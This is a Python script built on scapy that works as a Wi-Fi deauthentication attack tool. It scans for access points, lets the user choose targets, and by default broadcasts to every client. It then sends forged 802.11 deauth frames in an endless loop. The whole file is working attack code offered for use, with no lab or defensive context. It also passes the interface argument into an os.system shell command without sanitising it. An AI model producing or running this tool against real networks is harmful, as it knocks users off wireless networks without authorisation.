# To make this file compatible with linux comment out the channel selection code

from scapy.all import *
from datetime import datetime
import sys
import time
import subprocess
import os

client = "FF:FF:FF:FF:FF:FF" # Use FF:FF:FF:FF:FF:FF to deauth everyone on that network. Use a specific mac address to only deauth a certain device
found = {}
probe_list = []
aps = []

if len(sys.argv) < 2:
  print("usage: deauth.py <iface>")
  sys.exit(-1)
conf.iface = sys.argv[1]

os.system("clear")

manual = input("0 : scan for target APs \n1 : manual target AP entry\nchoice : ")
while manual != "0" and manual != "1":
  manual = input("Invalid choice\nchoice : ")

# WARNING: The following channel selection code only works on mac. Remove to make the code linux compatible.
# Select channel
channel = ""
while channel.isdigit() != True:
  channel = input("channel to use : ")
os.system("nohup /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport " + conf.iface + " sniff " + channel + " &")
time.sleep(0.5)

# Function to process captured packets
def sniffmgmt(p):
  stamgmtstypes = (0, 2, 4)
  if p.haslayer(Dot11) and p.type == 0 and p.subtype == 0x08 and hasattr(p, 'info'):
    ssid = ( len(p.info) > 0 and p.info != "\x00" ) and p.info or '<hidden>'
    probe = { "ssid": ssid, "cli": p.addr2 }
    key = "%s" % (p.addr2)
    found[key] = probe

def discover():
  global aps
  global probe_list
  # Capture n number of packets and use them to generate a list of available APs, their mac addresses and their SSIDs
  n = ""
  while n.isdigit() != True:
    n = input("number of packets to capture : ")
  n = int(n)

  sniff(iface=conf.iface, prn=sniffmgmt, monitor=True, count=n)

  probe_list = []

  # Make an array version of found so that each AP has a number associated with it for the user to choose
  for key,probe in found.items():
    item = [key,probe]
    probe_list.append(item)

  # Print out the list of discovered APs and their index so that the user can choose one
  for i in range(len(probe_list)):
    item = probe_list[i]
    print(str(i) + " : " + str(item[1]["ssid"])[2:-1] + " : " + item[1]["cli"])

  # Get & process user input
  n = ""
  while n.replace(",", "").isdigit() != True:
    n = input("target AP (r - rescan, q - quit, use commas to seperate multiple APs) : ")
    if n == "r":
      os.system("clear")
      discover()
      return
    elif n == "q":
      sys.exit()
  # n = int(n)

  aps = list(map(int, n.split(",")))

# Get AP address(es)
if manual == "0":
  discover()

if manual == "1":
  # TODO: Add option to add multiple mac addresses
  probe_list.append([0, {"cli": input("target AP MAC address : ")}])
  aps = [0]
  # TODO: Check if mac address is valid

# Option for manual client entry
# TODO: Add option for multiple clients
client = input("\nnmap can be used to find target client Mac addresses\ntarget client MAC address (* - all clients) : ")
# TODO: Check if mac address is valid
if client == "*":
  client = "FF:FF:FF:FF:FF:FF"

# Send packets forever
while True:
  for n in aps:
    ap = probe_list[n][1]["cli"]
    print(ap)

    # Create & send packet
    packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)
    sendp(packet, monitor=True) # If interface is already in monitor mode remove the monitor=true parameter
